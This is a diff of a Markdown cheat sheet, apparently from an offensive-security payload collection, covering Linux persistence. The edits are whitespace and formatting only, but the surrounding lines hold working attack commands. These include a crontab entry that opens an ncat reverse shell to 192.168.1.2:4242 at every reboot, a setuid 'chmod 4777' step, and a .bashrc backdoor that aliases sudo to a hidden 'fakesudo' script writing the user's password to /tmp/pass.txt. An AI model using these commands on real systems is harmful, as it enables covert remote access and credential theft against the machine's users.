@@ -15,7 +15,6 @@
 * [Tips](#tips)
 * [References](#references)
 
-
 ## Basic reverse shell
 
 ```bash
@@ -49,7 +48,7 @@ chmod 4777 $TMPDIR2/croissant
 (crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
 ```
 
-## Backdooring a user's bash_rc 
+## Backdooring a user's bash_rc
 
 (FR/EN Version)
 
@@ -70,8 +69,8 @@ rm /tmp/$TMPNAME2
 or add the following line inside its .bashrc file.
 
 ```powershell
-$ chmod u+x ~/.hidden/fakesudo
-$ echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc
+chmod u+x ~/.hidden/fakesudo
+echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc
 ```
 
 and create the `fakesudo` script.
@@ -85,7 +84,6 @@ echo $sudopass >> /tmp/pass.txt
 
 /usr/bin/sudo $@
 ```
-
 
 ## Backdooring a startup service
 
